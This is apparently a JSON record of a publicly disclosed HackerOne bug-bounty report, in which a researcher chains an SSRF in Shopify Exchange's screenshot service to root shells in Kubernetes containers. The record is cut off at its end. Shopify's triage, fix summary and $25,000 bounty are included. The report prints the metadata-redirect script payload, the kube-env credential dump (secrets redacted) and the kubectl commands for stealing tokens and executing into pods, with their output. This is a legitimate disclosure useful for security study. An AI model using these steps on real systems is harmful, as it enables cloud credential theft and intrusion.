@@ -1,0 +1,573 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-05-23T21:09:28.755Z", 
+    "voters": [
+        "delite", 
+        "jokebookservice1", 
+        "jin", 
+        "olihough86", 
+        "irvinlim", 
+        "shazad_sadiq", 
+        "nirvana-msu", 
+        "mvc", 
+        "sp1d3rs", 
+        "cache-money", 
+        "and 346 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "25000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 341876, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-05-23T20:59:54.217Z", 
+    "vulnerability_information": "## The Exploit Chain - How to get root access on all Shopify instances\n\n### 1 - Access Google Cloud Metadata\n- 1: Create a store (partners.shopify.com)\n- 2: Edit the template `password.liquid` and add the following content:\n\n```html\n<script>\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\";\n// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.\n</script>\n```\n\n- 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app\n- 4: Wait for the store screenshot to appear on the Create Listing page\n- 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)\n\n{F289082}\n\nExploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to \"bypass\" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.\n\nI tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`\u2588\u2588\u2588\u2588\u2588`), the instance name and more:\n\n```html\n<script>\nwindow.location=\"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json\";\n</script>\n```\n{F289081}\n\n**Can I add my SSH key using the leaked token? No**\n\n```bash\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/\u2588\u2588\u2588/setCommonInstanceMetadata\" -H \"Authorization: Bearer \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" -H \"Content-Type: application/json\" --data '{\"items\": [{\"key\": \"0xACB\", \"value\": \"test\"}]}'\n```\n```json\n{\n \"error\": {\n  \"errors\": [\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\"\n   },\n   {\n    \"domain\": \"global\",\n    \"reason\": \"forbidden\",\n    \"message\": \"Required 'iam.serviceAccounts.actAs' permission for 'projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\"\n   }\n  ],\n  \"code\": 403,\n  \"message\": \"Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\"\n }\n}\n```\n\nI checked the scopes for this token and there was no read/write access to the Compute Engine API:\n```bash\ncurl \"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"\n```\n```json\n{\n \"issued_to\": \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n \"audience\": \"\u2588\u2588\u2588\",\n \"scope\": \"https://www.googleapis.com/auth/cloud-platform\",\n \"expires_in\": 1307,\n \"access_type\": \"offline\"\n}\n```\n\n### 2 - Dumping kube-env\n\nI created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json\n\nResult:\n{F289455}\n\n**Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.\n\nSince the image is cropped, I made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.\n\nResult:\n{F289456}\n\n**ca.crt**\n```\n-----BEGIN CERTIFICATE-----\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n-----END CERTIFICATE-----\n```\r\n\n**client.crt**\n```\n-----BEGIN CERTIFICATE-----\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n-----END CERTIFICATE-----\n```\n\n**client.pem**\n```\n-----BEGIN RSA PRIVATE KEY-----\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n-----END RSA PRIVATE KEY-----\n```\n\n**MASTER_NAME**: \u2588\u2588\u2588\u2588\u2588\n\n### 3 - Using Kubelet to execute arbitrary commands\n\nIt's possible to list all pods {F289460}:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588 get pods --all-namespaces\n\nNAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                    1/1    \n```\n\nAnd create new pods as well:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml\n\npod \"shell-demo\" created\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 delete pod shell-demo\n\npod \"shell-demo\" deleted\n```\n\nI didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588`. However, it's not possible to execute commands in this new pod or any other pod:\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 exec -it shell-demo -- /bin/bash\n\nError from server (Forbidden): pods \"shell-demo\" is forbidden: User \"\u2588\u2588\u2588\" cannot create pods/exec in the namespace \"default\": Unknown user \"\u2588\u2588\u2588\"\n```\r\n\nThe `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `\u2588\u2588\u2588\u2588` from the namespace `\u2588\u2588\u2588\u2588`:\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588 describe pods/\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\nName:           \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nNamespace:      \u2588\u2588\u2588\u2588\u2588\u2588\nNode:           \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nStart Time:     Fri, 23 Mar 2018 13:53:13 +0000\nLabels:         \u2588\u2588\u2588\u2588\u2588\n                \u2588\u2588\u2588\u2588\n                \u2588\u2588\u2588\u2588\u2588\nAnnotations:    <none>\nStatus:         Running\nIP:             \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nControlled By:  \u2588\u2588\u2588\u2588\u2588\nContainers:\n  default-http-backend:\n    Container ID:   docker://\u2588\u2588\u2588\n    Image:          \u2588\u2588\u2588\u2588\u2588\u2588\n    Image ID:       docker-pullable://\u2588\u2588\u2588\u2588\u2588\n    Port:           \u2588\u2588\u2588\u2588/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Sun, 22 Apr 2018 03:23:09 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    2\n      Started:      Fri, 20 Apr 2018 23:39:21 +0000\n      Finished:     Sun, 22 Apr 2018 03:23:07 +0000\n    Ready:          True\n    Restart Count:  180\n    Limits:\n      cpu:     10m\n      memory:  20Mi\n    Requests:\n      cpu:        10m\n      memory:     20Mi\n    Liveness:     http-get http://:\u2588\u2588\u2588/healthz delay=30s timeout=5s period=10s #success=1 #failure=3\n    Environment:  <none>\n    Mounts:\n      \u2588\u2588\u2588\u2588\u2588\u2588\nConditions:\n  Type           Status\n  Initialized    True\n  Ready          True\n  PodScheduled   True\nVolumes:\n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n    Optional:    false\nQoS Class:       Guaranteed\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:          <none>\n```\n\n```bash\n$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588 get secret\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588 -o yaml\n\napiVersion: v1\ndata:\n  ca.crt: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n  namespace: \u2588\u2588\u2588\u2588\n  token: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588==\nkind: Secret\nmetadata:\n  annotations:\n    kubernetes.io/service-account.name: default\n    kubernetes.io/service-account.uid: \u2588\u2588\u2588\u2588\n  creationTimestamp: 2017-01-23T16:08:19Z\n  name:\u2588\u2588\u2588\u2588\u2588\n  namespace: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n  resourceVersion: \"115481155\"\n  selfLink: /api/v1/namespaces/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/secrets/\u2588\u2588\u2588\u2588\n  uid: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ntype: kubernetes.io/service-account-token\n```\n\nAnd finally, it's possible to use this token to get a shell in any container:\n```bash\n$ kubectl --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588 --token \"\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\" exec -it w\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/w\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' to see all of the containers in this pod.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\u2588\u2588\u2588\u2588\u2588:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588:/# exit\n```\n\n```bash\n$ kubectl --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588 --token \"\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" exec -it \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -- /bin/bash\n\nDefaulting container name to web.\nUse 'kubectl describe pod/\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588' to see all of the containers in this pod.\nroot@\u2588\u2588\u2588\u2588:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@\u2588\u2588\u2588\u2588:/# ls\napp  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\nroot@\u2588\u2588\u2588\u2588\u2588:/# exit\n```\n\n---\n*Huge thanks to [Lu\u00eds Maia](https://www.linkedin.com/in/luis-maia-7714023a) [0xfad0](http://hackerone.com/0xfad0), for helping me build this \u2588\u2588\u2588\u2588\u2588*\n\n## Impact\n\n**CRITICAL**\n\nThe hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Can internal services be reached bypassing network access control?**\nYes\n\n**What internal services were accessible?**\nGoogle Cloud Metadata\n\n**Security Impact**\nRCE\n\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "medium", 
+        "score": 6.9, 
+        "author_type": "Team"
+    }, 
+    "title": "SSRF in Exchange leads to ROOT access in all instances", 
+    "is_member_of_team?": null, 
+    "vote_count": 356, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 7516, 
+            "content": "Shopify infrastructure is isolated into subsets of infrastructure. @0xacb reported it was possible to gain root access to any container in one particular subset by exploiting a server side request forgery bug in the screenshotting functionality of Shopify Exchange. Within an hour of receiving the report, we disabled the vulnerable service, began auditing applications in all subsets and remediating across all our infrastructure. The vulnerable subset did not include Shopify core.\n\nAfter auditing all services, we fixed the bug by deploying a metadata concealment proxy to disable access to metadata information. We also disabled access to internal IPs on all infrastructure subsets. We awarded this $25,000 as a Shopify Core RCE since some applications in this subset do have access to some Shopify core data and systems.", 
+            "content_html": "<p>Shopify infrastructure is isolated into subsets of infrastructure. <a href=\"/0xacb\">@0xacb</a> reported it was possible to gain root access to any container in one particular subset by exploiting a server side request forgery bug in the screenshotting functionality of Shopify Exchange. Within an hour of receiving the report, we disabled the vulnerable service, began auditing applications in all subsets and remediating across all our infrastructure. The vulnerable subset did not include Shopify core.</p>\n\n<p>After auditing all services, we fixed the bug by deploying a metadata concealment proxy to disable access to metadata information. We also disabled access to internal IPs on all infrastructure subsets. We awarded this $25,000 as a Shopify Core RCE since some applications in this subset do have access to some Shopify core data and systems.</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "exchange.shopify.com", 
+        "max_severity": "medium", 
+        "databaseId": 6663, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$25,000", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-23T00:21:22.826Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-23T00:21:22.826Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks for your report @0xacb, our engineering team is investigating and we will let you know when we have an update.", 
+            "markdown_message": "<p>Thanks for your report <a href=\"/0xacb\">@0xacb</a>, our engineering team is investigating and we will let you know when we have an update.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2652093, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-04-23T13:08:07.256Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-23T13:08:07.256Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "0xacb", 
+                "url": "/0xacb"
+            }, 
+            "message": "We've disabled the vulnerable service last night, thank you again for reporting this. As per our program rules, I'm paying this initial amount on triage, with the rest once the issue has been closed.", 
+            "markdown_message": "<p>We&#39;ve disabled the vulnerable service last night, thank you again for reporting this. As per our program rules, I&#39;m paying this initial amount on triage, with the rest once the issue has been closed.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2653370, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-23T13:32:56.859Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-23T13:32:56.859Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thank you for the initial reward :)\n\nI forgot to mention, but I stopped exploring this when I achieved RCE. I'm not sure if I would be able to access other clusters on the project network (10.0.0.0)", 
+            "markdown_message": "<p>Thank you for the initial reward :)</p>\n\n<p>I forgot to mention, but I stopped exploring this when I achieved RCE. I&#39;m not sure if I would be able to access other clusters on the project network (10.0.0.0)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2653719, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-27T17:25:11.338Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-27T17:25:11.338Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hi @0xacb,\nthanks again for this report and the level of detail you provided, it was extremely helpful. I just wanted to provide a quick update. As you know, we immediately patched on the weekend. We are continuing to implement network changes to prevent the behaviour again should another SSRF vulnerability be discovered in the future. Given the sensitivity around this, we're taking our time to ensure proper mitigations. We're hoping to be able to resolve it soon but will keep you up to date on the progress.", 
+            "markdown_message": "<p>Hi <a href=\"/0xacb\">@0xacb</a>,<br>\nthanks again for this report and the level of detail you provided, it was extremely helpful. I just wanted to provide a quick update. As you know, we immediately patched on the weekend. We are continuing to implement network changes to prevent the behaviour again should another SSRF vulnerability be discovered in the future. Given the sensitivity around this, we&#39;re taking our time to ensure proper mitigations. We&#39;re hoping to be able to resolve it soon but will keep you up to date on the progress.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2673451, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-27T19:56:18.941Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-27T19:56:18.941Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks for the update, Peter!", 
+            "markdown_message": "<p>Thanks for the update, Peter!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2673955, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-17T15:02:29.447Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-17T15:02:29.447Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hello @shopify-peteryaworski,\nAny updates on the progress?\nThank you!", 
+            "markdown_message": "<p>Hello <a href=\"/shopify-peteryaworski\">@shopify-peteryaworski</a>,<br>\nAny updates on the progress?<br>\nThank you!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2757300, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-18T12:35:46.086Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-18T12:35:46.086Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Hi @0xacb,\nsorry, we don't have an update. We will let you know when we do.", 
+            "markdown_message": "<p>Hi <a href=\"/0xacb\">@0xacb</a>,<br>\nsorry, we don&#39;t have an update. We will let you know when we do.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2762459, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "0xacb", 
+                "url": "/0xacb"
+            }, 
+            "created_at": "2018-05-23T19:03:53.395Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T19:03:53.395Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks again for your report @0xacb and your patience. As you know, we patched this immediately. We've finished implementing the network changes necessary to prevent this from occurring again. You should hear back from us shortly regarding the bounty.\n\nOn that note, this was a great find @0xacb! Thank you for taking the time to improve the security of Shopify. We greatly appreciate it. We hope to see more reports from you and for others to use this report as an great learning opportunity.", 
+            "markdown_message": "<p>Thanks again for your report <a href=\"/0xacb\">@0xacb</a> and your patience. As you know, we patched this immediately. We&#39;ve finished implementing the network changes necessary to prevent this from occurring again. You should hear back from us shortly regarding the bounty.</p>\n\n<p>On that note, this was a great find <a href=\"/0xacb\">@0xacb</a>! Thank you for taking the time to improve the security of Shopify. We greatly appreciate it. We hope to see more reports from you and for others to use this report as an great learning opportunity.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2787629, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T20:28:51.972Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T20:28:51.972Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Sounds great, @shopify-peteryaworski!\nIt was really a pleasure to work with you :)", 
+            "markdown_message": "<p>Sounds great, <a href=\"/shopify-peteryaworski\">@shopify-peteryaworski</a>!<br>\nIt was really a pleasure to work with you :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2787920, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-05-23T20:59:27.091Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T20:59:27.091Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "24500.0", 
+            "collaborator": {
+                "username": "0xacb", 
+                "url": "/0xacb"
+            }, 
+            "message": "Thanks again @0xacb!", 
+            "markdown_message": "<p>Thanks again <a href=\"/0xacb\">@0xacb</a>!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2788021, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T20:59:54.263Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T20:59:54.263Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2788022, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T21:07:36.391Z", 
+            "is_internal": false, 
+            "editable": false, 
